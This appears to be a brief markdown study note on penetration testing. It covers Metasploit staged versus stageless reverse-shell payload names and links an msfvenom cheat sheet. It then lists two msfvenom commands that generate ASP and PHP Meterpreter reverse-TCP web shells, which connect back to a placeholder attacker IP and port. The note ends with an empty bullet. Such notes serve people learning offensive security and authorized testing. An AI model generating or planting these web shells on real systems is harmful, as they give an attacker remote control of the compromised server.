
# Shell Code
- there is a difference between 
  - windows/shell_reverse_tcp
  - windows/shell/reverse_tcp

## shell code creation
- creation of general shells once something is exploited
- here's a great cheat sheet as well: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

  ###

  ### Web Payloads
    - asp 
      - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
    - php
      - msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
    - 


